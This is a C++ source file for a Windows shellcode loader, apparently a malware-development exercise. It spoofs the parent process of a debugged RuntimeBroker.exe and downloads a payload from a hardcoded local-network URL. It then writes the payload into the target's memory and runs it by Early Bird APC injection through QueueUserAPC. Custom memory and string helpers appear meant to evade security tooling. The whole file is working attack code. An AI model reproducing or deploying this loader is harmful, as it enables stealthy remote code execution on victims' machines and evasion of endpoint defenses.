#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "includes/memcpy.h"
#include "includes/memset.h"
#include "includes/strcpy.h"
#include "includes/strcat.h"
#include "includes/strlen.h"
//#include "includes/ZeroMemoryEx.h"
#include "includes/Wininet_Structs.h"

#pragma comment (lib, "Wininet.lib")
#pragma comment (lib, "User32.lib")

InOpenW pInOpenW = reinterpret_cast<InOpenW>(GetProcAddress(GetModuleHandleA("wininet.dll"), "InternetOpenW"));
InOpUrlW pInOpUrlW = reinterpret_cast<InOpUrlW>(GetProcAddress(GetModuleHandleA("wininet.dll"), "InternetOpenUrlW"));
InReadFile pInReadFile = reinterpret_cast<InReadFile>(GetProcAddress(GetModuleHandleA("wininet.dll"), "InternetReadFile"));
InSetOpt pInSetOpt = reinterpret_cast<InSetOpt>(GetProcAddress(GetModuleHandleA("wininet.dll"), "InternetSetOptionW"));
InClH pInClH = reinterpret_cast<InClH>(GetProcAddress(GetModuleHandleA("wininet.dll"), "InternetCloseHandle"));

#define PRINTA( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }  

VOID ZeroMemoryEx(_Inout_ PVOID Destination, _In_ SIZE_T Size)
{
	PULONG Dest = (PULONG)Destination;
	SIZE_T Count = Size / sizeof(ULONG);

	while (Count > 0)
	{
		*Dest = 0;
		Dest++;
		Count--;
	}

	return;
}

void* __cdecl memcp(_Inout_ PVOID Destination, _In_ CONST PVOID Source, _In_ SIZE_T Length)
{
	PBYTE D = (PBYTE)Destination;
	PBYTE S = (PBYTE)Source;

	while (Length--)
		*D++ = *S++;

	return Destination;
}

BOOL GetRemoteProcessHandle(IN DWORD dwProcessId, OUT HANDLE* hProcess) {
	PROCESSENTRY32 Proc = {};
	Proc.dwSize = sizeof(PROCESSENTRY32);


	HANDLE hSnapShot = NULL;

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		wprintf(L"[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	if (!Process32First(hSnapShot, &Proc)) {
		wprintf(L"[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		if (Proc.th32ProcessID == dwProcessId) {
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				wprintf(L"[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

	} while (Process32Next(hSnapShot, &Proc));

_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*hProcess == INVALID_HANDLE_VALUE)
		return FALSE;
	return TRUE;
}

BOOL CreateDebugProcess(IN const char* lpProcessName, IN HANDLE hParentProcess, OUT DWORD* dwProcessID, OUT HANDLE* hProcess, OUT HANDLE* hThread) {
    
    CHAR lpPath[MAX_PATH * 2] = "C:\\WINDOWS\\System32\\RuntimeBroker.exe";
	CHAR CurrentDir[MAX_PATH];
	CHAR WnDr[MAX_PATH];

	SIZE_T                             sThreadAttList = NULL;
	PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;

    STARTUPINFOEXA SIEx;
    PROCESS_INFORMATION PI;

	ZeroMemoryEx(&SIEx, sizeof(STARTUPINFOEXA));
	ZeroMemoryEx(&PI, sizeof(PROCESS_INFORMATION));

	SIEx.StartupInfo.cb = sizeof(STARTUPINFO);

    if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		PRINTA("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

	InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);

	// Allocating enough memory
	pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
	if (pThreadAttList == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Calling InitializeProcThreadAttributeList again, but passing the right parameters
	if (!InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList)) {
		printf("[!] InitializeProcThreadAttributeList Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	if (!UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hParentProcess, sizeof(HANDLE), NULL, NULL)) {
		printf("[!] UpdateProcThreadAttribute Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Setting the LPPROC_THREAD_ATTRIBUTE_LIST element in SiEx to be equal to what was
	// created using UpdateProcThreadAttribute - that is the parent process
	SIEx.lpAttributeList = pThreadAttList;


    //sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
	
	char n_lpPath[MAX_PATH];

	strcpyA(n_lpPath, lpPath);
	strcatA(n_lpPath, WnDr);
	strcatA(n_lpPath, "\\System32\\");
	strcatA(n_lpPath, lpProcessName);
	
	PRINTA("\n[i] Running : \"%s\" ... \n", lpPath);


    if (!CreateProcessA(NULL, lpPath, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | DEBUG_PROCESS, NULL, NULL, &SIEx.StartupInfo, &PI)) {
		PRINTA("[!] CreateProcess with Error : %d\n", GetLastError());
        return FALSE;
    };

    *dwProcessID = PI.dwProcessId;
    *hProcess = PI.hProcess;
    *hThread = PI.hThread;
    
	DeleteProcThreadAttributeList(pThreadAttList);
	CloseHandle(hParentProcess);

    if (*dwProcessID != NULL && *hProcess != NULL && *hThread != NULL)
        return TRUE;
 
    return FALSE;
}

BOOL GetBytesFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {

	BOOL		bSTATE = TRUE;

	HINTERNET	hInternet = NULL,
		hInternetFile = NULL;

	DWORD		dwBytesRead = NULL;

	SIZE_T		sSize = NULL;
	PBYTE		pBytes = NULL,
		pTmpBytes = NULL;


	hInternet = InternetOpenW(NULL, NULL, NULL, NULL, NULL);
	if (hInternet == NULL) {
		PRINTA("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}

	PRINTA("MARK...\n");
	hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
	if (hInternetFile == NULL) {
		PRINTA("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
		bSTATE = FALSE; goto _EndOfFunction;
	}


	pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
	if (pTmpBytes == NULL) {
		bSTATE = FALSE; goto _EndOfFunction;
	}

	while (TRUE) {
		
		if (!pInReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
			PRINTA("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
			bSTATE = FALSE; goto _EndOfFunction;
		}

		sSize += dwBytesRead;

		if (pBytes == NULL)
			pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
		else
			pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);

		if (pBytes == NULL) {
			bSTATE = FALSE; goto _EndOfFunction;
		}
		memcp((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
		memset(pTmpBytes, '\0', dwBytesRead);

		if (dwBytesRead < 1024) {
			break;
		}
	}



	*pPayloadBytes = pBytes;
	*sPayloadSize = sSize;

_EndOfFunction:
	if (hInternet)
		InternetCloseHandle(hInternet);
	if (hInternetFile)
		InternetCloseHandle(hInternetFile);
	if (hInternet)
		InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
	if (pTmpBytes)
		LocalFree(pTmpBytes);
	return bSTATE;
}

BOOL InjectShellcode(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sSizeOfShellcode, OUT PVOID* ppAddress) {

	SIZE_T	sNumberOfBytesWritten = NULL;
	DWORD	dwOldProtection = NULL;


	*ppAddress = VirtualAllocEx(hProcess, NULL, sSizeOfShellcode, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (*ppAddress == NULL) {
		PRINTA("\n\t[!] VirtualAllocEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	PRINTA("\n\t[i] Allocated Memory At : 0x%p \n", *ppAddress);


	PRINTA("\t[#] Press <Enter> To Write Payload ... ");
	
	if (!WriteProcessMemory(hProcess, *ppAddress, pShellcode, sSizeOfShellcode, &sNumberOfBytesWritten) || sNumberOfBytesWritten != sSizeOfShellcode) {
		PRINTA("\n\t[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
		return FALSE;
	}
	PRINTA("\t[i] Successfully Written %d Bytes\n", sNumberOfBytesWritten);


	if (!VirtualProtectEx(hProcess, *ppAddress, sSizeOfShellcode, PAGE_EXECUTE_READ, &dwOldProtection)) {
		PRINTA("\n\t[!] VirtualProtectEx Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	return TRUE;
}

int main(){
    DWORD dwProcessID;
    HANDLE hProcess;
    HANDLE hThread;

    const char* ProcessName = "RuntimeBroker.exe";

    PVOID pAddress;
	
	HANDLE hParentProcess;
	DWORD dwParentProcessID = 3992;


	LPCWSTR Url = L"http://192.168.0.101/cal.txt";

	PBYTE pPayloadBytes;
	SIZE_T sPayloadSize;

	if ((hParentProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwParentProcessID)) == NULL) {
		printf("[!] OpenProcess Failed with Error : %d \n", GetLastError());
		return -1;
	}

	//GetRemoteProcessHandle(dwParentProcessID, &hParentProcess);
	//printf("[i] Creating \"%s\" Process As A Debugged Process ... ", ProcessName);
    if (!CreateDebugProcess(ProcessName, hParentProcess,&dwProcessID, &hProcess, &hThread)) {
		PRINTA("CreateDebugProcess Failed with Error: %d\n", GetLastError());
		return 1;
	};
	PRINTA("\n\t[i] Target Process Created With Pid : %d \n", dwProcessID);

	PRINTA("\t[i] Getting Shellcode From Url...\n");
	if (!GetBytesFromUrl(Url, &pPayloadBytes, &sPayloadSize)) {
		PRINTA("GetBytesFromUrl Failed With Error: %d\n", GetLastError());
		return 1;
	}
	
	PRINTA("\t[i] Writing Shellcode To The Target Process ... \n");
	
	if (!InjectShellcode(hProcess, pPayloadBytes, sPayloadSize, &pAddress)) {
		PRINTA("InjectShellcode Failed With Error: %d \n", GetLastError());
		return 1;
	}
	PRINTA("[+] DONE \n\n");
	getchar();
	QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL);


	PRINTA("[#] Press <Enter> To Run Shellcode ... ");
	
	PRINTA("[i] Detaching The Target Process ... ");
	DebugActiveProcessStop(dwProcessID);
	PRINTA("[+] DONE \n\n");

	PRINTA("[#] Press <Enter> To Quit ... ");
	
	CloseHandle(hProcess);
	CloseHandle(hThread);

    return 0;
}

